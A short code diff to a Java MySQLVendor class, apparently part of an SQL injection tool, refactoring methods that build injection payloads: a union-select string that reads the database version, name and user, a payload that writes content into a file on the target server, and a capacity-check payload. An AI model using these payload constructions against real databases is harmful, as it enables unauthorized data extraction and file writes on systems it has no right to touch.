@@ -22,8 +22,7 @@ public class MySQLVendor extends AbstractVendor {
                         "0x04," +
                         "version()," +
                         "database()," +
-                        "user()," +
-                        "CURRENT_USER" +
+                        "user()" +
                     ")" +
                 "" +
                 "," +
@@ -182,7 +181,7 @@ public class MySQLVendor extends AbstractVendor {
     @Override
     public String getSqlTextIntoFile(String content, String filePath) {
         return
-            MediatorModel.model().indexesInUrl
+            MediatorModel.model().getIndexesInUrl()
                 .replaceAll(
                     "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
                     "(select+0x" + StringUtil.strhex(content) + ")"
@@ -354,7 +353,7 @@ public class MySQLVendor extends AbstractVendor {
     @Override
     public String getSqlIndicesCapacityCheck(String[] indexes) {
         return
-            MediatorModel.model().indexesInUrl.replaceAll(
+            MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select+concat(0x53514c69,$1,repeat(0x23,65536),0x010303074c5153))"
             );
